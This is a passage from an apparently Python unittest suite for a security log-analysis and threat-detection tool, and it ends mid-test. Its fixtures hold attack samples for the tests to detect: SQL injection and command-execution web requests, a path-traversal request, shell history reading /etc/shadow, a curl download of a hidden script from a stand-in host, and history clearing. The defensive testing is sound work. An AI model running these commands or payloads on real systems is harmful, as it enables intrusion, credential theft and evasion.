from _support import *
from xml.sax.saxutils import escape as _xml_escape
import zipfile


def _write_minimal_xlsx(path: Path, rows):
    def cell_ref(col: int, row: int) -> str:
        name = ""
        col += 1
        while col:
            col, rem = divmod(col - 1, 26)
            name = chr(ord("A") + rem) + name
        return f"{name}{row}"

    sheet_rows = []
    for row_index, row in enumerate(rows, start=1):
        cells = []
        for col_index, value in enumerate(row):
            ref = cell_ref(col_index, row_index)
            text = _xml_escape(str(value or ""))
            cells.append(f'<c r="{ref}" t="inlineStr"><is><t>{text}</t></is></c>')
        sheet_rows.append(f'<row r="{row_index}">{"".join(cells)}</row>')
    sheet_xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        f'<sheetData>{"".join(sheet_rows)}</sheetData></worksheet>'
    )
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
            '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
            "</Types>"
        ))
        archive.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
            "</Relationships>"
        ))
        archive.writestr("xl/workbook.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            '<sheets><sheet name="EDR" sheetId="1" r:id="rId1"/></sheets></workbook>'
        ))
        archive.writestr("xl/_rels/workbook.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
            "</Relationships>"
        ))
        archive.writestr("xl/worksheets/sheet1.xml", sheet_xml)


class ParserRegressionTests(unittest.TestCase):
    def test_collect_files_prunes_hidden_dirs_and_symlink_escapes(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "case"
            root.mkdir()
            inside = root / "auth.log"
            inside.write_text("Mar 15 10:01:00 host sshd: accepted password\n", encoding="utf-8")
            shell_history = root / ".bash_history"
            shell_history.write_text("id\ncat /etc/shadow\n", encoding="utf-8")
            hidden_dir = root / ".git"
            hidden_dir.mkdir()
            hidden_file = hidden_dir / "config"
            hidden_file.write_text("secret=1\n", encoding="utf-8")
            outside = Path(tmp) / "outside.log"
            outside.write_text("should not be collected through a symlink\n", encoding="utf-8")
            link = root / "linked-outside.log"
            try:
                link.symlink_to(outside)
                symlink_available = True
            except (OSError, NotImplementedError):
                symlink_available = False

            files = collect_files([str(root)])

        self.assertIn(str(inside), files)
        self.assertIn(str(shell_history), files)
        self.assertNotIn(str(hidden_file), files)
        if symlink_available:
            self.assertNotIn(str(link), files)

    def test_collect_files_skips_doc_files_in_directories_but_honors_explicit(self):
        """目录遍历时跳过 README 等文档（避免文档里的安全关键词被当日志产生高危误报），
        但用户显式指定的文档文件仍尊重其意图。"""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "case"
            root.mkdir()
            log = root / "access.log"
            log.write_text('1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "GET / HTTP/1.1" 200 1 "-" "-"\n', encoding="utf-8")
            readme = root / "README.md"
            readme.write_text("# 说明\n| 文件 | EDR 告警 含 tactic/technique/webshell/jndi |\n", encoding="utf-8")

            collected = collect_files([str(root)])
            explicit = collect_files([str(readme)])

        self.assertIn(str(log), collected)
        self.assertNotIn(str(readme), collected)
        self.assertIn(str(readme), explicit)

    def test_web_payload_with_spaces_is_detected_as_sqli(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /login.php?id=1 UNION SELECT NULL-- HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )

        result = parse_web_access(content, "access.log")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "SQL注入")

        summary = run_detection(result.events)
        self.assertTrue(any(alert.rule_name == "Web攻击: SQL注入" for alert in summary.alerts))

    def test_web_parser_does_not_flag_browser_ua_or_id_param_as_command(self):
        content = (
            "202.130.127.38 - - [15/May/2017:02:09:03 -0700] "
            "\"GET / HTTP/1.1\" 200 10792 \"-\" "
            "\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"\n"
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /article?id=123 HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n"
        )

        result = parse_web_access(content, "access.log")

        # 浏览器 UA 与 ?id= 查询参数都不能被误判为命令注入/攻击。新版会把首页成功访问
        # 保留为 INFO 级基线上下文，但良性查询参数请求不应单独留痕，且任何保留事件
        # 都不得带 web-attack 攻击特征。
        messages = [event.message for event in result.events]
        self.assertNotIn("GET /article?id=123 -> 200", messages)
        self.assertFalse(any("web-attack" in event.tags for event in result.events))
        self.assertTrue(all(event.level is ThreatLevel.INFO for event in result.events))

    def test_web_parser_still_detects_command_execution_params(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /vuln.php?cmd=id HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n"
        )

        result = parse_web_access(content, "access.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "命令注入/代码执行")

    def test_web_parser_filters_benign_redirects_without_losing_sensitive_redirect(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET / HTTP/1.1\" 301 10 \"-\" \"Mozilla/5.0\"\n"
            "1.1.1.1 - - [15/Mar/2024:10:00:01 +0800] "
            "\"GET /style.css HTTP/1.1\" 304 10 \"-\" \"Mozilla/5.0\"\n"
            "1.1.1.1 - - [15/Mar/2024:10:00:02 +0800] "
            "\"GET /wp-admin/ HTTP/1.1\" 301 10 \"-\" \"Mozilla/5.0\"\n"
        )

        result = parse_web_access(content, "access.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "敏感文件探测")
        self.assertEqual(result.events[0].details.get("status"), "301")

    def test_web_attack_ip_can_still_create_volume_alert(self):
        content = "".join(
            "198.51.100.30 - - [15/Mar/2024:10:00:%02d +0800] "
            "\"GET /login.php?id=1%%20UNION%%20SELECT%%20NULL-- HTTP/1.1\" 200 10 \"-\" \"sqlmap\"\n" % (i % 60)
            for i in range(120)
        )

        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        self.assertTrue(any(event.category == "流量异常" for event in result.events))
        self.assertTrue(any(alert.rule_name.startswith("Web攻击:") for alert in summary.alerts))
        self.assertTrue(any(alert.rule_id == "RECON-003" for alert in summary.alerts))

    def test_edr_xlsx_auto_parse_detects_unsigned_fake_software_chain(self):
        rows = [
            [
                "事件类型", "事件子类型", "时间", "进程用户名", "进程ID", "进程名",
                "进程映像路径", "进程文件签名", "进程SHA1值", "目标进程PID",
                "进程事件文件路径", "目标进程文件签名", "文件SHA1值", "文件类型",
                "文件大小", "上次修改时间", "创建时间", "最后访问时间", "进程命令",
            ],
            [
                "进程事件", "进程创建", "2026-01-21 21:38:00", "SYSTEM", "1828",
                "services.exe", r"C:\Windows\System32\services.exe", "Microsoft Windows Publisher",
                "395aa8b83cf4087ef62ca5407c6f69abf229411b", "15072",
                r"C:\Windows\System32\svchost.exe", "Microsoft Windows Publisher",
                "3f64c98f22da277a07cab248c44c56eedb796a81", "exe", "79920", "", "", "",
                r"C:\Windows\System32\svchost.exe -k netsvcs",
            ],
            [
                "进程事件", "进程创建", "2026-01-21 21:40:00", "Administrator", "4743",
                "TencentttMeeti5681.exe",
                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe",
                "", "", "5109",
                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe",
                "", "5819a2e46ceee9c7cab09cfedb14a83efe9e312d", "exe", "875008", "", "", "",
                r'"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe"',
            ],
            [
                "进程事件", "进程加载", "2026-01-21 21:41:00", "Administrator", "5065",
                "3Fv6Bsq.exe",
                r"C:\Users\Administrator\Documents\NCElSz\c8XAtk\3Fv6Bsq.exe",
                "", "be6316f0906fed16e477d0eca5bb07919fea25bc", "0",
                r"C:\Windows\System32\TAuxMod64.dll", "Guangzhou TEC Solutions Co., Ltd.",
                "89662b6df6fbdc0c507b41fc7b603b0585787ffc", "dll", "1234", "", "", "",
                r'"C:\Users\Administrator\Documents\NCElSz\c8XAtk\3Fv6Bsq"',
            ],
            [
                "进程事件", "进程创建", "2026-01-21 21:41:01", "Administrator", "5065",
                "II-10.tmp",
                r"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp",
                "", "", "5099",
                r"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT.exe",
                "", "", "exe", "5593032", "", "", "",
                r'"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT"',
            ],
        ]
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "日志查询.xlsx"
            _write_minimal_xlsx(path, rows)

            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "EDR Excel Export")
        self.assertEqual(result.stats.total, 4)
        high_events = [event for event in result.events if event.level == ThreatLevel.HIGH]
        self.assertGreaterEqual(len(high_events), 2)
        self.assertTrue(any("masquerading" in event.tags for event in high_events))
        self.assertTrue(any("random-name" in event.tags for event in high_events))
        self.assertTrue(all(event.details.get("p0_kind") == "edr" for event in high_events))
        security_component = next(event for event in result.events if event.details.get("target_process") == "TAuxMod64.dll")
        self.assertEqual(security_component.level, ThreatLevel.INFO)
        self.assertIn("security-component-load", security_component.tags)

        summary = run_detection(result.events)
        edr_alert = next(alert for alert in summary.alerts if alert.rule_id == "P0-EDR-001")
        self.assertEqual(edr_alert.mitre_phase, "执行")

    def test_shell_history_export_with_header_not_misrouted_to_p0(self):
        """真实 shell history 导出常带 ``# host=... source=....bash_history`` 头并以
        ``.log`` 命名；其 key=value 头不能让 p0 解析器抢走导致 0 事件。"""
        content = (
            "# host=web-prod-03 user=svc_app source=/home/svc_app/.bash_history extracted_at=2026-05-18T02:10:00+08:00\n"
            "whoami\n"
            "cat /etc/passwd\n"
            "find / -perm -4000 -type f 2>/dev/null\n"
            "curl -fsS https://updates-cdn.example.invalid/ping -o /tmp/.cache/.healthcheck.py\n"
            "unset HISTFILE\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "06_shell_history_web-prod-03.log"
            path.write_text(content, encoding="utf-8")
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Shell History")
        self.assertGreater(result.stats.total, 0)
        # 清理痕迹 unset HISTFILE 应被识别为 T1070.* 防御规避/反取证。
        self.assertTrue(
            any(str(event.mitre_attack or "").startswith("T1070") for event in result.events),
            [event.message for event in result.events],
        )

    def test_unified_multi_source_jsonl_routes_all_sources(self):
        """统一多源 JSONL（每行带 source 标签）须按来源分流到各子解析器，而不是被单一
        解析器认领、其余来源静默丢弃。"""
        lines = [
            {"timestamp": "2026-05-18T01:39:12+08:00", "source": "nginx_access", "host": "web",
             "raw": '203.0.113.77 - - [18/May/2026:01:39:12 +0800] "GET /index.php?s=index/think/invokefunction HTTP/1.1" 200 10 "-" "curl/8"'},
            {"timestamp": "2026-05-18T01:38:32+08:00", "source": "linux_auth", "host": "web",
             "raw": "May 18 01:38:32 web sshd[1]: Failed password for invalid user admin from 203.0.113.77 port 51000 ssh2"},
            {"timestamp": "2026-05-18T01:40:49+08:00", "source": "edr_alert", "host": "web", "user": "svc_app",
             "severity": "critical", "tactic": "Command and Control", "technique": "T1071.001",
             "alert_name": "PowerShell network connection to rare domain", "process": "powershell.exe"},
            {"timestamp": "2026-05-18T01:40:56+08:00", "source": "windows_event", "host": "db",
             "channel": "Security", "event_id": 4624, "logon_type": 3, "user": "svc_backup",
             "src_ip": "10.20.3.15", "message": "An account was successfully logged on"},
        ]
        content = "\n".join(_json.dumps(item) for item in lines) + "\n"
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "unified.jsonl"
            path.write_text(content, encoding="utf-8")
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Unified Multi-Source (JSONL)")
        # 四种来源都应有事件落地，而不是只认领一种。
        sources = {event.source_file for event in result.events}
        self.assertGreaterEqual(result.stats.total, 4, [e.message for e in result.events])
        mitres = {str(event.mitre_attack or "") for event in result.events}
        # EDR 标注的 C2 技术应被贯通到事件 MITRE。
        self.assertIn("T1071.001", mitres, [(e.message, e.mitre_attack) for e in result.events])

    def test_edr_xlsx_flags_system_cleanup_acl_portproxy_and_archive_context(self):
        header = [
            "事件类型", "事件子类型", "时间", "进程用户名", "进程名",
            "进程映像路径", "进程文件签名", "进程事件文件路径",
            "目标进程文件签名", "文件类型", "文件大小", "进程命令",
        ]
        rows = [
            header,
            [
                "进程事件", "进程创建", "2026-01-21 12:27:00", "Administrator",
                "Explorer.EXE", r"C:\windows\Explorer.EXE", "Microsoft Windows",
                r"C:\Program Files\7-Zip\7zG.exe", "", "exe", "553984",
                r'"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\Administrator\Downloads\TencentttMeeti5681\" -spe',
            ],
            [
                "进程事件", "进程创建", "2026-01-21 12:27:59", "SYSTEM",
                "elevation_service.exe",
                r"C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.139\elevation_service.exe",
                "Microsoft Corporation", r"C:\windows\system32\schtasks.exe",
                "Microsoft Windows", "exe", "258048",
                'schtasks.exe /delete /tn "9C773OPWwZPGaqDwUHQyB" /f',
            ],
            [
                "进程事件", "进程创建", "2026-01-21 12:27:59", "SYSTEM",
                "elevation_service.exe",
                r"C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.139\elevation_service.exe",
                "Microsoft Corporation", r"C:\Windows\System32\cmd.exe",
                "Microsoft Windows", "exe", "323584",
                r'C:\Windows\System32\cmd.exe /c icacls "C:\inetpub\wwwroot\rMmZhp\ewWB4p\." /deny "Users":(D) & icacls "C:\inetpub\wwwroot\rMmZhp\ewWB4p\." /grant "Users":(OI)(CI)(RX)',
            ],
            [
                "进程事件", "进程创建", "2026-01-21 12:40:00", "SYSTEM",
                "elevation_service.exe",
                r"C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.139\elevation_service.exe",
                "Microsoft Corporation", r"C:\windows\system32\netsh.exe",
                "Microsoft Windows", "exe", "118784",
                r'"C:\windows\system32\netsh.exe" interface portproxy reset',
            ],
        ]
        content = "\n".join("\t".join(row) for row in rows)

        result = parse_content(content, "edr-export.tsv", parser_name="edr-xlsx")
        by_rule = {event.rule_id: event for event in result.events if event.rule_id}

        self.assertEqual(by_rule["EDR-XLSX-ARCHIVE-EXTRACT"].level, ThreatLevel.MEDIUM)
        self.assertEqual(by_rule["EDR-XLSX-SCHTASKS-DELETE"].mitre_attack, "T1053.005")
        self.assertIn("task-cleanup", by_rule["EDR-XLSX-SCHTASKS-DELETE"].tags)
        self.assertEqual(by_rule["EDR-XLSX-RANDOM-ACL"].mitre_attack, "T1222.001")
        self.assertIn("acl-modification", by_rule["EDR-XLSX-RANDOM-ACL"].tags)
        self.assertEqual(by_rule["EDR-XLSX-PORTPROXY-RESET"].level, ThreatLevel.MEDIUM)
        self.assertIn("network-config", by_rule["EDR-XLSX-PORTPROXY-RESET"].tags)

        summary = run_detection(result.events)
        alert = next(alert for alert in summary.alerts if alert.rule_id == "P0-EDR-001")
        self.assertEqual(len(summary.alerts), 1)
        self.assertIn("计划任务删除=1", "\n".join(alert.evidence))
        self.assertIn("随机目录ACL修改=1", "\n".join(alert.evidence))
        self.assertIn("portproxy reset=1", "\n".join(alert.evidence))

    def test_edr_xlsx_content_parser_supports_tsv_rows(self):
        content = "\n".join([
            "\t".join(["事件类型", "事件子类型", "时间", "进程用户名", "进程名", "进程映像路径", "进程文件签名", "进程事件文件路径", "目标进程文件签名", "进程命令"]),
            "\t".join([
                "进程事件", "进程创建", "2026-01-21 21:40:00", "Administrator",
                "II-10.tmp", r"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp",
                "", r"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT.exe", "",
                r'"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT"',
            ]),
        ])

        result = parse_content(content, "edr-export.tsv", parser_name="edr-xlsx")

        self.assertEqual(result.log_type, "EDR Excel Export")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].level, ThreatLevel.HIGH)
        self.assertIn("webroot-executable", result.events[0].tags)

    def test_windows_event_with_malformed_logon_type_is_not_dropped(self):
        xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data>"
            "<Data Name=\"IpAddress\">1.2.3.4</Data>"
            "<Data Name=\"LogonType\">-</Data></EventData></Event>"
        )

        event = _parse_xml_event(xml, "security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.event_id, "4625")
        self.assertEqual(event.user, "bob")

    def test_windows_4624_without_source_ip_stays_in_general_parser(self):
        xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"LogonType\">10</Data></EventData></Event>"
        )

        event = _parse_xml_event(xml, "Security.xml")

        self.assertIsNotNone(event)
        self.assertEqual(event.event_id, "4624")
        self.assertEqual(event.user, "alice")

    def test_windows_successful_logon_feeds_cn_hvv_success_after_bruteforce(self):
        xml = "".join(
            "<Event><System><EventID>4625</EventID>"
            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
            for i in range(5)
        )
        xml += (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
        )

        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertTrue(any("successful-login" in event.tags for event in result.events if event.event_id == "4624"))
        self.assertTrue(any(alert.rule_id == "CN-HVV-002" for alert in summary.alerts))

    def test_evtx_missing_python_evtx_blocks_empty_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            evtx_path = Path(tmp) / "Security.evtx"
            evtx_path.write_bytes(b"ElfFile\x00\x00")

            real_import = __import__

            def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
                if name.startswith("Evtx"):
                    raise ImportError("No module named Evtx")
                return real_import(name, globals, locals, fromlist, level)

            with mock.patch("builtins.__import__", side_effect=fake_import):
                with self.assertRaises(AnalysisError) as ctx:
                    run_analysis(AnalysisOptions(paths=[str(evtx_path)]), quiet=True)

        msg = str(ctx.exception)
        self.assertIn("python-evtx", msg)
        self.assertIn("未被解析", msg)

    def test_parse_files_surfaces_partial_file_failures(self):
        ok = ParseResult("ok.log", "Fixture", [
            LogEvent(
                id="ok-1",
                timestamp="2024-03-15T10:00:00",
                level=ThreatLevel.INFO,
                category="测试",
                source="fixture",
                source_file="ok.log",
                message="ok",
                raw_line="ok",
            )
        ], ParseStats(total=1))
        errors = []

        with mock.patch("bla.core.pipeline.auto_parse", side_effect=[ok, RuntimeError("boom")]):
            results = parse_files(["ok.log", "bad.log"], jobs=0, quiet=True, errors_out=errors)

        self.assertEqual(results, [ok])
        self.assertEqual(len(errors), 1)
        self.assertIn("bad.log", errors[0])
        self.assertIn("boom", errors[0])

    def test_parse_files_disambiguates_duplicate_basenames_with_relative_labels(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            host_a = root / "host-a"
            host_b = root / "host-b"
            host_a.mkdir()
            host_b.mkdir()
            first = host_a / "access.log"
            second = host_b / "access.log"
            first.write_text(
                '9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] '
                '"GET /admin.php HTTP/1.1" 404 10 "-" "curl/8"\n',
                encoding="utf-8",
            )
            second.write_text(
                '198.51.100.10 - - [15/Mar/2024:10:00:01 +0800] '
                '"GET /download.php?file=../../etc/passwd HTTP/1.1" 200 10 "-" "Mozilla/5.0"\n',
                encoding="utf-8",
            )

            results = parse_files([str(first), str(second)], jobs=1, quiet=True)

        names = {result.file_name for result in results}
        event_sources = {event.source_file for result in results for event in result.events}
        self.assertEqual(names, {"host-a/access.log", "host-b/access.log"})
        self.assertEqual(event_sources, names)
        for name in names:
            self.assertFalse(Path(name).is_absolute())
            self.assertNotIn(str(root), name)

    def test_windows_system_account_creation_is_not_persistence_alert(self):
        xml = (
            "<Event><System><EventID>4720</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T14:16:33.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">WDAGUtilityAccount</Data>"
            "<Data Name=\"TargetDomainName\">WIN</Data>"
            "<Data Name=\"SubjectUserName\">MINWINPC$</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertNotIn("account-creation", event.tags)
        self.assertEqual(event.details.get("account_sensitivity"), "system-initialization")

        summary = run_detection([event])
        self.assertFalse(any(alert.rule_id == "PERS-003" for alert in summary.alerts))

    def test_windows_low_risk_group_add_does_not_raise_privilege_alert(self):
        xml = (
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T14:16:40.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Users</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberName\">-</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1001</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertNotIn("privilege-escalation", event.tags)
        self.assertEqual(event.details.get("group_sensitivity"), "low")
        self.assertIn("S-1-5-21-1-2-3-1001", event.message)

        summary = run_detection([event])
        self.assertFalse(any(alert.rule_id == "PRIV-001" for alert in summary.alerts))

    def test_windows_admin_group_add_keeps_operator_and_privilege_alert(self):
        xml = (
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:37.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Administrators</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberName\">-</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("group-add", event.tags)
        self.assertEqual(event.details.get("group_sensitivity"), "privileged")
        self.assertIn("Builtin\\Administrators", event.message)

        summary = run_detection([event])
        alert = next(a for a in summary.alerts if a.rule_id == "PRIV-001")
        self.assertTrue(any("Administrator" in item for item in alert.evidence))
        self.assertTrue(any("目标组: Builtin\\Administrators" in item for item in alert.evidence))

    def test_windows_new_admin_account_remote_logon_chain_becomes_incident(self):
        xml = (
            "<Event><System><EventID>4720</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:13.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"TargetSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4722</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:13.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4724</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:14.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:37.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Administrators</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4776</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:22.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"Workstation\">CHINARAN404</Data>"
            "<Data Name=\"Status\">0x0</Data></EventData></Event>"
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"IpAddress\">192.168.126.1</Data>"
            "<Data Name=\"WorkstationName\">CHINARAN404</Data>"
            "<Data Name=\"LogonType\">10</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events)

        chain = next(alert for alert in summary.alerts if alert.rule_id == "WIN-CHAIN-001")
        self.assertEqual(chain.level, ThreatLevel.CRITICAL)
        self.assertTrue(any("来源IP: 192.168.126.1" in item for item in chain.evidence))
        self.assertTrue(any("来源工作站: CHINARAN404" in item for item in chain.evidence))
        top = summary.incidents[0]
        self.assertIn("可疑本地管理员账号与远程登录", top.title)
        self.assertEqual(top.confidence, "high")
        self.assertIn("192.168.126.1", top.source_ips)
        self.assertIn("WIN-N8G63QC50SQ\\hack168$", top.accounts)
        self.assertIn("持久化", top.attack_phases)
        self.assertIn("权限提升", top.attack_phases)
        self.assertIn("远程访问", top.attack_phases)

    def test_windows_4688_process_creation_is_not_generic_t1059(self):
        xml = (
            "<Event><System><EventID>4688</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"NewProcessName\">C:\\Windows\\System32\\smss.exe</Data>"
            "<Data Name=\"ParentProcessName\">System</Data>"
            "<Data Name=\"CommandLine\">smss.exe</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Security.xml")
        event = result.events[0]
        self.assertIsNone(event.mitre_attack)
        self.assertIn("process-creation", event.tags)

        summary = run_detection(result.events)
        self.assertFalse(any(item.phase == "执行" for item in summary.attack_chain))

    def test_windows_4688_credential_dump_command_feeds_credential_detector(self):
        xml = (
            "<Event><System><EventID>4688</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
